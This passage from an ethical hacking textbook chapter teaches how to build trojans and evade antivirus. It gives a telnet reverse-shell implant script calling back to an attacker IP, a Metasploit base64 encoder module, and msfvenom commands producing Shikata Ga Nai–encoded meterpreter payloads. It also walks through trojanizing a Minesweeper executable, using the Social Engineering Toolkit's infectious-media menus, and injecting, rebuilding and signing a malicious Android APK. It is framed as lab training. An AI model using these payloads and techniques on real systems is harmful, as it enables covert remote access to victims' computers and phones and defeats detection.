   5   cmd/powershell_base64 manual  No     Powershell Base64 Command Encoder<br/>
   40  x86/shikata_ga_nai    manual  No     Polymorphic XOR Additive Feedback<br/>
                            ...</pre>
		<p class="indent">Let’s take a closer look at the two encoders shown in this output, starting with the easiest one.</p>
		<h4 class="h4" id="ch10lev15"><strong><em>The Base64 Encoder</em></strong></h4>
		<p class="noindent">The <code>powershell_base64</code> encoder uses the base64 encoding scheme, which converts binary sequences to text, just like the ASCII encoding scheme mentioned in <a href="ch05.xhtml#ch5">Chapter 5</a>. However, unlike ASCII, which converts 8-bit sequences, the base64 encoder converts 6-bit sequences to one of 64 possible printable characters. Consider the example in <a href="ch10.xhtml#ch10tab1">Table 10-1</a>, which converts the Linux <code>ls</code> command from ASCII to base64.</p>
		<p class="tabcap" id="ch10tab1"><strong>Table 10-1:</strong> The Conversion of ASCII to base64</p>
		<table class="box">
			<colgroup>
				<col style="width:6%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
				<col style="width:5.8%"/>
			</colgroup>
			<thead>
				<tr>
					<th class="borderrb" style="vertical-align: top;">
						<p class="tab">ASCII</p>
					</th>
					<th class="borderrb" colspan="8" style="vertical-align: top;">
						<p class="tab-c">l</p>
					</th>
					<th class="borderb" colspan="8" style="vertical-align: top;">
						<p class="tab-c">s</p>
					</th>
				</tr>
			</thead>
			<tbody>
				<tr>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">Binary</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">0</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">0</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">0</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">0</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">0</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">0</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">0</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">1</p>
					</td>
				</tr>
				<tr>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">Decimal (0-64)</p>
					</td>
					<td class="borderrb" colspan="6" style="vertical-align: top;">
						<p class="tab-c">27</p>
					</td>
					<td class="borderrb" colspan="6" style="vertical-align: top;">
						<p class="tab-c">7</p>
					</td>
					<td class="borderrb" colspan="4" style="vertical-align: top;">
						<p class="tab-c">12</p>
					</td>
				</tr>
				<tr>
					<td class="borderrb" style="vertical-align: top;">
						<p class="tab">Base64</p>
					</td>
					<td class="borderrb" colspan="6" style="vertical-align: top;">
						<p class="tab-c">b</p>
					</td>
					<td class="borderrb" colspan="6" style="vertical-align: top;">
						<p class="tab-c">H</p>
					</td>
					<td class="borderrb" colspan="4" style="vertical-align: top;">
						<p class="tab-c">M</p>
					</td>
				</tr>
			</tbody>
		</table>
		<p class="indent">The last section has only four bits, so the remaining two bits are assumed to be 0, and the padding character (<code>=</code>) is added to the end. Here is the base64encoded result: <code>bHM=</code>.</p>
		<p class="indent">Can we execute this base64-encoded value? Yes, if we decode it and pass it to the shell before we run the program:</p>
		<pre>kali@kali:~$ <span class="codestrong1">base64 -d &lt;&lt;&lt; bHM= | sh</span></pre>
		<p class="indent">This command passes the base64-encoded string to the base64 decoder (<code>-d</code>), which converts the string back to ASCII encoding before piping (|) it to the shell (<code>sh</code>) to be executed. <a href="ch10.xhtml#ch10fig7">Figure 10-7</a> shows an overview of this encoding and decoding pipeline.</p>
		<div class="image" id="ch10fig7">
			<img alt="image" src="../images/ch10fig07.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-7: The encoding and decoding pipeline</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_202"/>A Bash script containing the <code>ls</code> command will have a different signature from a file containing base64-encoded values of the <code>base64 -d &lt;&lt;&lt; bHM= | sh</code> command, even though they are functionally equivalent. This is because both files are stored using ASCII encoding. Because the signatures are different, an antivirus program may fail to detect the malicious file containing the base64 values, as described in <a href="ch10.xhtml#ch10fig8">Figure 10-8</a>.</p>
		<div class="image" id="ch10fig8">
			<img alt="image" src="../images/ch10fig08.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-8: The binary signature of two functionally equivalent files can differ.</em></p>
		<p class="indent">However, there is a weakness to this technique. Once the signature detection algorithm captures an encoded implant with the new signature, it will be able to detect all future instances of the encoded implants because the base64 encoding never changes. In the Shikata Ga Nai Encoder section of this chapter, we’ll explore how to create a polymorphic encoder that generates a new signature each time it runs.</p>
		<p class="indent">For now, let’s complete the discussion of the base64 encoder by writing an implant and then, as an exercise, we’ll create a Metasploit module to encode it. Create a new file in the <em>Malware</em> folder called <em>implant.sh</em> and copy in the code snippet that follows. The script will use telnet to establish two connections. It will receive commands from the first connection on port 80 and upload the results using the second connection on port 443.</p>
		<pre>#!/bin/sh<br/>echo ("Establishing Reverse Shell")<br/>telnet <span class="codeitalic">&lt;Kali IP address&gt;</span> 80 | sh | telnet <span class="codeitalic">&lt;KALI-IP&gt;</span> 443</pre>
		<p class="indent">Use the netcat (<code>nc</code>) utility to create two TCP servers in separate terminals:</p>
		<pre>kali@kali:~$ <span class="codestrong1">nc -lv 80</span><br/>kali@kali:~$ <span class="codestrong1">nc -lv 443</span></pre>
		<h4 class="h4" id="ch10lev16"><strong><em>Writing a Metasploit Module</em></strong></h4>
		<p class="noindent">Let’s write a Metasploit module that will base64 encode the implant. Metasploit modules are written in the Ruby program language. Don’t worry. Ruby looks a lot like Python, so you’ll pick it up easily. Also, the Metasploit Framework is open source, and you can view the <em>cmd/powershell_base64</em> encoder by visiting <em><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/cmd/powershell_base64.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/cmd/powershell_base64.rb</a></em>. This encoder is used to encode PowerShell scripts for Windows machines.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_203"/>Take some time to look at the <em>powershell_base64</em> encoder before we begin to write our own version that encodes Bash scripts for Linux machines. Create a new folder in your <em>Malware</em> folder called <em>Encoders</em> and then create a new file called <em>bash_base64.rb</em> inside the <em>Encoders</em> folder. We’ll implement our base64 encoder in this file, so copy in the following:</p>
		<pre>class MetasploitModule &lt; Msf::Encoder<br/>
 <span class="ent">➊</span> Rank = NormalRanking<br/><br/>
   def initialize<br/>
    <span class="ent">➋</span> super(<br/>
        'Name'             =&gt; 'Bash Base64 Encoder',<br/>
        'Description'      =&gt; %q{<br/>
          Base64 encodes bash scripts.<br/>
        },<br/>
        'Author'           =&gt; 'An Ethical Hacker',<br/>
       )<br/>
    end<br/><br/>
  <span class="ent">➌</span> def encode_block(state, buf)<br/>
         unicode = Rex::Text.to_unicode(buf)<br/>
         base64 = Rex::Text.encode_base64(unicode)<br/>
         cmd = "base64 -d &lt;&lt;&lt; #{base64} | sh"<br/>
         return cmd<br/>
    end</pre>
		<p class="indent">We inherit (<code>::</code>) from the encoder superclass and then specify the rank, or quality, of the module <span class="ent">➊</span>. Modules range in quality from Manual to Excellent, depending on the reliability and amount of human intervention needed. We use the <code>super</code> <span class="ent">➋</span> keyword to call the superclass’s constructor and provide information on our module. After our module has initialized, the Metasploit Framework will split the input into blocks and call the <code>encode_block()</code> function <span class="ent">➌</span> on each block. We convert the values to ASCII Unicode before base64 encoding them.</p>
		<p class="indent">To test your new encoder, add it to the Metasploit Framework by copying it into the <em>encoders</em> folder, which you can find by opening your file explorer and navigating to <em>/usr/share/metasploit-framework/modules/encoders</em>. Create a new folder called <em>bash</em> and save your <em>bash_base64.rb</em> encoder file here.</p>
		<p class="indent">Open a new terminal and run the <code>show encoder</code> command in the <code>msfconsole</code> to ensure that your module was added correctly:</p>
		<pre>      bash/bash_base64    manual  No     Bash Base64 Encoder</pre>
		<p class="indent"><span epub:type="pagebreak" id="page_204"/>If your module is present, use <code>msfvenom</code> and your module to encode your implant. Run the following command to create your encoded implant and save it as <em>implantEncoded</em>:</p>
		<pre>kali@kali:~/Desktop/Malware/$ <span class="codestrong1">implant.sh | msfvenom --payload --arch x86 --</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">platform --encoder bash/bash_base64 -o implantEncoded</span></pre>
		<p class="indent">Test your encoded implant by making it executable and running it:</p>
		<pre>kali@kali:~/Desktop/Malware/$ <span class="codestrong1">chmod +x implantEncoded</span><br/>kali@kali:~/Desktop/Malware/$ <span class="codestrong1">./implantEncoded</span></pre>
		<p class="indent">Great, you’ve written a simple base64 encoder. However, it has some limitations. In addition to the fact that it will always produce the same signature, it can’t encode compiled binaries. As an ethical hacker, you’ll often load binary versions of the tools you create onto target machines. If you want to avoid detection, it’s a good idea to encode these binaries themselves. The Shikata Ga Nai encoder allows you to encode binaries.</p>
		<h4 class="h4" id="ch10lev17"><strong><em>Shikata Ga Nai Encoder</em></strong></h4>
		<p class="noindent">The <em>Shikata Ga Nai (SGN) encoder</em> encodes payloads by XOR-ing the bytes in the payload with a randomly selected number called an <em>initialization vector</em>. The strategy is similar to the one-time pad encryption algorithm discussed in <a href="ch05.xhtml#ch5">Chapter 5</a>. However, the SGN encoder includes the initialization vector and decoder code as part of the payload, so it loads the initialization vector and then starts the decoder when the payload runs. The decoder loops through the memory addresses associated with the encoded part of the payload and decodes an instruction by XOR-ing it with the initialization vector at each iteration of the loop. The decoder then replaces the encoded instruction with the decoded instruction in memory.</p>
		<p class="indent">Once all instructions have been decoded and replaced, the decoding loop ends and the CPU executes the decoded region. Because the decoder is usually partially encoded, it’s difficult for an antivirus program’s signature detection algorithm to identify the payload based solely on the decoder’s signature.</p>
		<p class="indent">The SGN encoder can make the reverse engineering process more difficult by calculating a new initialization vector for each instruction. For example, it can add the newly decoded bytes to the previous initialization vector, as shown in <a href="ch10.xhtml#ch10fig9">Figure 10-9</a>.</p>
		<div class="image" id="ch10fig9">
			<span epub:type="pagebreak" id="page_205"/>
			<img alt="image" src="../images/ch10fig09.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-9: The process of encoding bytes with the SGN encoder</em></p>
		<p class="indent">The SGN encoder further complicates the reverse engineering process by using additional arithmetic (addition and subtraction) to compute the initialization vector.</p>
		<p class="indent">The SGN encoder is often referred to as a <em>polymorphic encoder</em>. A polymorphic encoder will generate a new signature each time it runs, as long as a hacker selects a new initialization vector and runs the encoder for multiple iterations. The following command generates an SGN-encoded payload; remember to replace <code>&lt;Kali-IP&gt;</code> with the IP address of your Kali Linux machine:</p>
		<pre>kali@kali:~/Desktop/Malware/$ <span class="codestrong1">sudo msfvenom -a x86 --platform linux -p linux/x86/meterpreter/</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">reverse_tcp LHOST=<span class="codeitalic">&lt;Kali IP address&gt;</span> LPORT=443</span> <span class="ent">➊</span> <span class="codestrong1">--encoder x86/shikata_ga_nai -i 4 -f</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">elf -o malicious</span><br/>
[sudo] password for kali:<br/>Found 1 compatible encoders<br/>Attempting to encode payload with 4 iterations of x86/shikata_ga_nai<br/>x86/shikata_ga_nai succeeded with size 150 (iteration=0)<br/>x86/shikata_ga_nai succeeded with size 177 (iteration=1)<br/>x86/shikata_ga_nai succeeded with size 204 (iteration=2)<br/>x86/shikata_ga_nai succeeded with size 231 (iteration=3)<br/>x86/shikata_ga_nai chosen with final size 231 Payload size: 231 bytes<br/>Final size of elf file: 315 bytes<br/>Saved as: malicious</pre>
		<p class="indent">We’ve used the <code>--encoder</code> option to specify the SGN encoder <span class="ent">➊</span>.</p>
		<h3 class="h3" id="ch10lev18"><span epub:type="pagebreak" id="page_206"/><strong>Creating a Windows Trojan</strong></h3>
		<p class="noindent">So far, we’ve discussed how to create a trojan for Linux. The process of creating a Windows trojan is similar, as you can do it with <code>msfvenom</code>, too. We’ll cover two methods of hiding your implant: in a fun, open source implementation of the game Minesweeper by Humaeed Ahmed, and in a document using the Social Engineering Toolkit (more on this in a moment).</p>
		<h4 class="h4" id="ch10lev19"><strong><em>Hiding the Trojan in Minesweeper</em></strong></h4>
		<p class="noindent">I’ve forked Ahmed’s repository, and you can download a copy of the executable from the following link: <em><a href="https://github.com/The-Ethical-Hacking-Book/Minesweeper/blob/master/Minesweeper/bin/Debug/Minesweeper.exe">https://github.com/The-Ethical-Hacking-Book/Minesweeper/blob/master/Minesweeper/bin/Debug/Minesweeper.exe</a></em>. Save it to your <em>Malware</em> folder on your Kali desktop.</p>
		<div class="note">
			<p class="notet"><strong><span class="notes">NOTE</span></strong></p>
			<p class="notep"><em>Do you trust this executable? Now you’re thinking like a hacker. The repository also contains the source code needed to build it yourself if you don’t trust me.</em></p>
		</div>
		<p class="indent">After you’ve downloaded the executable, use <code>msfvenom</code> to transform it into a malicious trojan by running the following command:</p>
		<pre>kali@kali:~/Desktop/Malware/$ <span class="codestrong1">msfvenom -a x86 --platform windows -x program.</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">exe -k -p windows/shell/bind_tcp -e x86/shikata_ga_nai lhost=&lt;Kali IP</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">address&gt;-f exe -o evilProgram.exe</span></pre>
		<p class="indent">Here, the <code>-e</code> flag specifies that we’ll use the SGN encoder we just discussed. Many of these options are the same as when we first ran <code>msfvenom</code>, with the exception of the <code>-k</code> flag, which tells <code>msfvenom</code> to keep regular execution of the program and run the payload in a separate thread. You don’t need to memorize these options; you can view their documentation by running <code>msfvenom</code> with the <code><strong>--help</strong></code> option:</p>
		<pre>kali@kali:~/Desktop/Malware/$ <span class="codestrong1">msfvenom --help</span><br/>MsfVenom - a Metasploit standalone payload generator.<br/>Also a replacement for msfpayload and msfencode.<br/>Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;<br/>Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 exe -o payload.exe<br/><br/>Options:<br/>
    -l, --list &lt;type&gt; List all modules for [type]. Types are: payloads,<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 encoders, nops, platforms, archs, encrypt, formats, all<br/>
    -p, --payload &lt;payload&gt; Payload to use (--list payloads to list, --list-<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 options for arguments). Specify '-'or STDIN for custom<br/>
        --list-options List --payload &lt;value&gt;'s standard, advanced and evasion<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 options<br/>
    -f, --format &lt;format&gt; Output format (use --list formats to list)<br/>
...</pre>
		<h4 class="h4" id="ch10lev20"><span epub:type="pagebreak" id="page_207"/><strong><em>Hiding the Trojan in a Word Document (or Another Innocent File)</em></strong></h4>
		<p class="noindent">There’s a problem: Windows users rarely install new programs, and they’re incredibly suspicious of programs they’re asked to install via email. However, users open Word documents, PowerPoint presentations, and PDF files almost daily. You could embed implants in these files, too. The <em>Social Engineering Toolkit (SET)</em> abstracts the Metasploit Framework’s details and makes it easy to send and generate this kind of infected media. Run the following command to start SET:</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo setoolkit</span></pre>
		<p class="indent">After the toolkit starts, you should see the following menu. Select the <strong>Social-Engineering Attacks</strong> option by entering <code><strong>1</strong></code> in the terminal:</p>
		<pre>   1) Social-Engineering Attacks<br/>
   2) Penetration Testing (Fast-Track)<br/>
   3) Third Party Modules</pre>
		<p class="indent">Next, select the <strong>Infectious Media Generator</strong> option:</p>
		<pre>   1) Spear-Phishing Attack Vectors<br/>
   2) Website Attack Vectors<br/>
   3) Infectious Media Generator<br/>
   4) Create a Payload and Listener</pre>
		<p class="indent">Then, select the <strong>File-Format Exploits</strong> option. This will let you embed implants in different kinds of files:</p>
		<pre>   1) File-Format Exploits<br/>
   2) Standard Metasploit Executable</pre>
		<p class="indent">Enter the IP address of the attacker server; in this case, your Kali Linux machine. Once you’ve done so, you should see a list of the available infection media attacks. This list of file formats will change as companies patch vulnerabilities and attackers discover new ones. Many of these attacks work only on a specific software version, so use the information you collected during your OSINT operations to carefully select one that your target uses:</p>
		<pre>   1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)<br/>
   2) SET Custom Written Document UNC LM SMB Capture Attack<br/>
   3) MS15-100 Microsoft Windows Media Center MCL Vulnerability<br/>
   4) MS14-017 Microsoft Word RTF Object Confusion (2014-04-01)<br/>
...<br/>
  13) Adobe PDF Embedded EXE Social Engineering<br/>
  14) Adobe util.printf() Buffer Overflow<br/>
...<br/>
  17) Adobe PDF Embedded EXE Social Engineering (NOJS)<br/>
  18) Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow<br/>
  19) Apple QuickTime PICT PnSize Buffer Overflow</pre>
		<p class="indent"><span epub:type="pagebreak" id="page_208"/>Microsoft Office documents, like Word, Excel, and PowerPoint files, support <em>macros</em>, which are small programs that users can write to automate tasks in Office documents. Macros run when you open a document; however, Microsoft Office disables macros by default because they are a security risk. Whenever a document contains a macro, Microsoft Office will display a banner that allows the user to enable macros. An attacker could embed a malicious macro into a document that downloads and executes a shell when a user opens it. In 2021, a state-sponsored attacker used a malicious Word document to break into a Russian defense contractor. You can read about this attack by the Lazarus group on the Kaspersky website.</p>
		<p class="indent">Now that we’ve examined techniques for creating trojans for desktops and servers, let’s create trojans for mobile and embedded devices.</p>
		<h3 class="h3" id="ch10lev21"><strong>Creating an Android Trojan</strong></h3>
		<p class="noindent">The process of creating trojans for Android devices is almost identical to that of creating Linux trojans. The directory structure might differ, but as you did earlier in this chapter, you’ll modify an installation package to install your implant.</p>
		<p class="indent">The Android installation package is called an <em>Android Package (APK)</em> file. This file contains everything the Android operating system needs to install a new app. Let’s begin by using <code>msfvenom</code> to generate a malicious APK. Create a new Desktop folder called <em>AndroidTrojan</em> and then navigate to it:</p>
		<pre>kali@kali:~$ <span class="codestrong1">cd ~/Desktop/AndroidTrojan</span></pre>
		<p class="indent">Next, generate a new malicious APK that contains a reverse shell implant:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan$ <span class="codestrong1">msfvenom -p android/meterpreter/reverse_tcp</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">LHOST= <span class="codeitalic">&lt;Kali IP address&gt;</span> LPORT=443 &gt; malicious.apk</span></pre>
		<p class="indent">This command generates a new Android APK with malicious code embedded within it. In the next section, we’ll disassemble this application and discuss its structure so that you can create your own Android trojan.</p>
		<h4 class="h4" id="ch10lev22"><strong><em>Deconstructing the APK to View the Implant</em></strong></h4>
		<p class="noindent">The command in the preceding example did all the work for you. To understand how it hid the implant, let’s decompile the <em>malicious.apk</em> install file and explore its directory structure. We’ll use <code>apktool</code>, a reverse engineering tool, to decompile the APK. Run the following command to download and install <code>apktool</code>:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan$ <span class="codestrong1">sudo apt-get install apktool</span></pre>
		<p class="indent">To decompile (<code>d</code>) the file, run the following command:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan$ <span class="codestrong1">apktool d malicious.apk</span><br/>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true<br/><span epub:type="pagebreak" id="page_209"/>I: Using Apktool 2.4.1-dirty on malicious2.apk<br/>I: Loading resource table...<br/>I: Decoding AndroidManifest.xml with resources...<br/>I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk<br/>I: Regular manifest package...<br/>I: Decoding file-resources...<br/>
...</pre>
		<p class="indent">The tool will create a folder called <em>malicious</em> that contains the decompiled files. Navigate to this folder and list all the files and folders in the directory using the following commands:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan$ <span class="codestrong1">cd malicious</span><br/>kali@kali:~/Desktop/AndroidTrojan/malicious$ <span class="codestrong1">ls</span></pre>
		<p class="indent">You should see the following files and folders: <em>AndroidManifest.xml</em>, <em>apktool.yml</em>, <em>original</em>, <em>res</em>, and <em>smali</em>. The <em>AndroidManifest.xml</em> file describes your app. The following is a snippet from it:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan/malicious$ <span class="codestrong1">cat AndroidManifest.xml</span><br/>
&lt;manifest/&gt;<br/>
...<br/><span class="ent">➊</span> &lt;uses-permission android:name="android.permission.READ_CALL_LOG"/&gt;<br/>
    &lt;uses-permission android:name="android.permission.WRITE_CALL_LOG"/&gt;<br/>
    &lt;uses-permission android:name="android.permission.WAKE_LOCK"/&gt;<br/>
...<br/>
    &lt;uses-feature android:name="android.hardware.microphone"/&gt;<br/>
    &lt;application android:label="@string/app_name"&gt;<br/>
    <span class="ent">➋</span> &lt;&lt;activity android:label="@string/app_name" android:name=".MainActivity<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 "android:theme="@android:style/Theme.NoDisplay"&gt;<br/>
         &lt;intent-filter&gt;<br/>
            action android:name="android.intent.action.MAIN"/&gt;<br/>
             &lt;category android:name="android.intent.category.LAUNCHER"/&gt;<br/>
         &lt;/intent-filter&gt;<br/>
...<br/>
&lt;/manifest&gt;</pre>
		<p class="indent">This file includes your app’s permissions, like camera access or access to your call log <span class="ent">➊</span>. It also contains information about your app’s entry point <span class="ent">➋</span>, which is the first file your app runs when it starts.</p>
		<p class="indent">The <em>apktool.yml</em> file contains information on the APK, including its version number and type of compression. The <em>original</em> folder contains a compiled version of <em>AndroidManifest.xml</em>, a file containing its hash, and files containing information on the signatures. (These signatures are similar to the ones we discussed in <a href="ch06.xhtml#ch6">Chapter 6</a>. I’ll discuss these in more detail in the next subsection.) The <em>res</em> folder contains the application’s resources, such as images or strings.</p>
		<p class="indent">Lastly, the <em>smali</em> folder contains assembly files associated with the app. It is also where we have put the implant. You can view the assembly files <span epub:type="pagebreak" id="page_210"/>associated with the Metasploit implant by running <code>ls</code> on the <em>smali/com/ metasploit/stage/</em> directory:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan/malicious$ <span class="codestrong1">ls smali/com/metasploit/stage/</span><br/>
    a.smali  c.smali  e.smali  g.smali  MainBroadcastReceiver.smali<br/>
    Payload.smali b.smali  d.smali  f.smali<br/>
    MainActivity.smali  MainService.smali</pre>
		<p class="indent">If you’ve spent time working with mobile apps, you might have expected to see a <em>.dex</em> file. These files contain the byte code that the Android Runtime (ART) executes. The reason there isn’t one is that <em>smali</em> is the assembly representation and <em>.dex</em> is the machine representation of the app’s code. The <em>Payload.smali</em> file contains the code associated with our malicious implant, and we’ll transfer this file into another APK to create a trojan later.</p>
		<p class="indent">For now, let’s inspect the <em>MainActivity.smali</em> file:</p>
		<pre>.class public Lcom/metasploit/stage/MainActivity;<br/>
.super Landroid/app/Activity;<br/><br/>
...<br/>
# virtual methods<br/>
.method protected onCreate(Landroid/os/Bundle;)V<br/>
    .locals 0<br/>
    invoke-super {p0, p1}, Landroid/app/Activity;-&gt;onCreate(Landroid/os/Bundle<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 ;)V<br/>
 <span class="ent">➊</span> invoke-static {p0}, Lcom/metasploit/stage/MainService;-&gt;startService(<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 Landroid/content/Context;)V<br/><br/>
 <span class="ent">➋</span> <br/><br/>
    invoke-virtual {p0}, Lcom/metasploit/stage/MainActivity;-&gt;finish()V<br/>
    return-void<br/>
.end method</pre>
		<p class="indent">The malicious APK starts <code>MainService</code> <span class="ent">➊</span>, a malicious Android service written by the developers of the Metasploit Framework. This service will eventually load the payload in the background. If you wanted to start the malicious payload activity immediately, you could add the following snippet at <span class="ent">➋</span> in the preceding example:</p>
		<pre>invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;onCreate(Landroid/content<br/>
    
			<img alt="image" src="../images/arrow01.jpg"/>
			 /Context;)V</pre>
		<p class="indent">Similarly, you can create your own trojan by decompiling an existing APK, copying the <em>Metasploit</em> folder to the <em>smali</em> folder, and then adding the preceding snippet to <em>MainActivity.smali</em> to start the payload.</p>
		<h4 class="h4" id="ch10lev23"><span epub:type="pagebreak" id="page_211"/><strong><em>Rebuilding and Signing the APK</em></strong></h4>
		<p class="noindent">Now that we’ve inspected the file, we can rebuild it by running the following:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan/$ <span class="codestrong1">apktool build ~/Desktop/AndroidTrojan/</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">malicious -o malicious2.apk</span></pre>
		<p class="indent">All Android apps must be signed before they can be run on an Android device. You can do this with the <em>Java Keystore</em>, which stores and protects key material such as the public and private keys used for signing. Key material never leaves the Keystore. Instead, an application sends the Keystore its data, and the Keystore uses the protected key material to sign or encrypt data and returns the results, as illustrated in <a href="ch10.xhtml#ch10fig10">Figure 10-10</a>. Some systems even store key material in a separate piece of secure hardware called a trusted execution environment.</p>
		<div class="image" id="ch10fig10">
			<img alt="image" src="../images/ch10fig10.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-10: Key material never leaves the Keystore.</em></p>
		<p class="indent">Run the following command to install the Java Development Kit (JDK), which contains the tools we’ll use to sign the trojan APK:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan/$ <span class="codestrong1">sudo apt install -y default-jdk</span></pre>
		<p class="indent">Generate the RSA key we’ll use to sign the trojan by using this command:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan/$ <span class="codestrong1">keytool -genkey -keystore my-malicious.</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">keystore -alias alias_name_malicious -keyalg RSA -keysize 3072 -</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">validity 10000</span></pre>
		<p class="indent">We use Java’s <code>keytool</code> utility to generate a new key (<code>-genkey</code>). Instead of displaying the key pair, we store them in a Keystore file (<code>-keystore</code>) called <code>my-malicious.keystore</code>. The Keystore can store multiple entries, each of which is identified by an alias (<code>-alias</code>). Our entry is called <code>alias_name_malicious</code>. The next option specifies the cryptographic key algorithm (<code>-keyalg</code>). Here, we select <code>RSA</code> and set the key size (<code>-keysize</code>) to be <code>3072</code>. We also set the key to be valid (<code>-validity</code>) for 10,000 days.</p>
		<p class="indent">Now use Java’s <code>jarsigner</code> utility to sign the APK file:</p>
		<pre>kali@kali:~/Desktop/AndroidTrojan/$ <span class="codestrong1">jarsigner -sigalg SHA2withRSA -digestalg</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">SHA2 -keystore my-malicious.keystore malicious2.apk</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">alias_name_malicious</span></pre>
		<p class="indent"><span epub:type="pagebreak" id="page_212"/>First, we select the signature algorithm, using SHA2 with RSA (<code>-sigalg SHA2withRSA)</code>. Then we use SHA2 as our hash/digest function (<code>-digestalg SHA2</code>). Lastly, we specify the Keystore (<code>-keystore</code>) and the key alias. In this case, we’ll use the Keystore we just created (<code>my-malicious.keystore</code>) and the entry with the alias (<code>alias_name_malicious</code>).</p>
		<h4 class="h4" id="ch10lev24"><strong><em>Testing the Android Trojan</em></strong></h4>
		<p class="noindent">Now let’s see our malicious APK in action. We don’t want the malicious program on our phones, so let’s create a new virtual machine that emulates an Android phone. Google has developed an emulator that is bundled with Android Studio, its Android development environment. Follow the instructions at <em><a href="https://developer.android.com/studio/install/">https://developer.android.com/studio/install/</a></em> to download Android Studio on your host system, outside of your current virtual lab environment.</p>
		<p class="indent">After you’ve installed Android Studio, create an empty project by clicking the <strong>Start New Android Studio project</strong> and following the instructions presented. As rule of thumb, select the default options. Once you’ve created your project, create a new Android virtual device by selecting <strong>Tools</strong> ▶ <strong>AVD Manager</strong> or by clicking the Android Virtual Device Manager icon <span class="ent">➊</span>, as shown in <a href="ch10.xhtml#ch10fig11">Figure 10-11</a>.</p>
		<div class="image" id="ch10fig11">
			<img alt="image" src="../images/ch10fig11.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-11: The Android Virtual Device manager</em></p>
		<p class="indent">Create a new virtual device <span class="ent">➋</span> with the specifications of the device you’re targeting. Then click the play button <span class="ent">➌</span> to start it. It will take some time to start the virtual machine. When it’s started, you should see an emulated device.</p>
		<p class="indent">Your Kali Linux virtual machine can’t interact with your Android emulator because the emulator runs outside your virtual lab environment. Change the Kali connection settings in VirtualBox to <strong>Bridged Adapter</strong> so that it connects to the same local network as your Android emulator (<a href="ch10.xhtml#ch10fig12">Figure 10-12</a>). See <a href="ch01.xhtml#ch1">Chapter 1</a> for instructions on changing the Kali Linux network configuration, and remember to restore the previous settings after you complete this exercise.</p>
		<div class="image" id="ch10fig12">
			<span epub:type="pagebreak" id="page_213"/>
